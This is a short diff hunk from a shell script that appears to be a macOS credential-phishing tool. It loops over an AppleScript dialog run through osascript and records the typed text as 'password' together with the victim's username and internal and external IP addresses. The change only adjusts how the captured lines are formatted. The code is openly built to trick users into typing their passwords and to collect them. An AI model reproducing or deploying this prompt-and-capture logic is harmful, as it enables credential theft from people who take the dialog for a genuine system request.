@@ -42,7 +42,7 @@ fi
 for i in $( eval echo {0..$promptcount} )
 do
 dialogText=$(osascript -e "$applescriptCode");
-capture="$capture=$(echo ExternalIP="$externalip" + InternalIP="$internalip" + username="$username"  + password="$dialogText")";
+capture="$capture=$(echo -e ExternalIP="$externalip" + InternalIP="$internalip" + username="$username" + password="$dialogText" \\n\\r)";
 done
 
 if [ ! -z "$oflag" ]; then
